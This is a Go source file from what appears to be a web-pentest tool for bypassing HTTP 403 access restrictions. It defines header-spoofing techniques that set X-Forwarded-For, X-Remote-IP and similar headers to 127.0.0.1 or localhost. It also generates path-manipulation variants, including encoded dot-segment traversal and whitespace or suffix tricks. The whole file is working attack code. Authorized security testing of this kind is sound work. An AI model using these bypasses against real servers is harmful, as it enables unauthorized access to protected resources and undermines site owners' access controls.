package bypass

import (
	"net/http"
	"strings"
)

// BypassMethod defines the structure for a bypass technique
type BypassMethod struct {
	Name    string
	Apply   func(req *http.Request)
	Payload string
}

// GetBypassMethods returns a list of common 403 bypass techniques
func GetBypassMethods() []BypassMethod {
	return []BypassMethod{
		{
			Name: "X-Forwarded-For Bypass",
			Apply: func(req *http.Request) {
				req.Header.Set("X-Forwarded-For", "127.0.0.1")
			},
		},
		{
			Name: "X-Originating-IP Bypass",
			Apply: func(req *http.Request) {
				req.Header.Set("X-Originating-IP", "127.0.0.1")
			},
		},
		{
			Name: "X-Custom-IP-Authorization Bypass",
			Apply: func(req *http.Request) {
				req.Header.Set("X-Custom-IP-Authorization", "127.0.0.1")
			},
		},
		{
			Name: "X-Remote-IP Bypass",
			Apply: func(req *http.Request) {
				req.Header.Set("X-Remote-IP", "127.0.0.1")
			},
		},
		{
			Name: "X-Remote-Addr Bypass",
			Apply: func(req *http.Request) {
				req.Header.Set("X-Remote-Addr", "127.0.0.1")
			},
		},
		{
			Name: "X-Forwarded-Host Bypass",
			Apply: func(req *http.Request) {
				req.Header.Set("X-Forwarded-Host", "localhost")
			},
		},
	}
}

// GeneratePathBypasses generates path manipulation variations for a given path
func GeneratePathBypasses(path string) []string {
	path = strings.Trim(path, "/")
	if path == "" {
		return nil
	}

	return []string{
		"/" + path + "/",
		"/" + path + "/.",
		"// " + path + "//",
		"/./" + path + "/./",
		"/query/%2e%2e/" + path,
		"/" + path + "/%20",
		"/" + path + "%09",
		"/" + path + "?",
		"/" + path + ".html",
		"/" + path + "#",
	}
}

// ApplyBypass applies a set of headers to a request to attempt a bypass
func ApplyBypass(req *http.Request, method BypassMethod) {
	method.Apply(req)
}
